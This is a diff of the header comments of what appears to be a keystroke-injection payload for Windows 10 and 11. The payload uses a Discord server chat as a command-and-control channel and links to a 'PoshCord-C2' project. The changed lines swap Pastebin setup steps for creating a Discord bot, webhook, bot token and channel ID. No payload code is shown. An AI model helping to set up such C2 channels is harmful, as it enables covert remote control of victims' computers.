@@ -5,10 +5,12 @@ REM Description: Using a Discord Server Chat and a github text file to Act as a 
 REM Target: Windows 10 and 11
 
 REM SETUP
-REM Goto https://pastebin.com and make an account..
-REM Create an empty paste/file and copy the RAW url.
-REM Change PASTEBIN_URL_HERE to the RAW url  eg. https://pastebin.com/raw/QeCLTdea -OR- http://your.server.ip.here/files/file.txt 
-REM Change WEBHOOK_HERE to your webhook eg. https://discord.com/api/webhooks/123445623531/f4fw3f4r46r44343t5gxxxxxx
+REM make a discord bot at https://discord.com/developers/applications/
+REM add the bot to your discord server
+REM create a webhook in the desired channel on your server. ( channel-settings/integrations )
+REM Change WEBHOOK_URL below to your webhook URL eg. https://discord.com/api/webhooks/123445623531/f4fw3f4r46r44343t5gxxxxxx
+REM Change BOT_TOKEN below with your bot token
+REM Change CHANNEL_ID below to the channel id of your webhook.
 
 REM for more info goto - https://github.com/beigeworm/PoshCord-C2
 
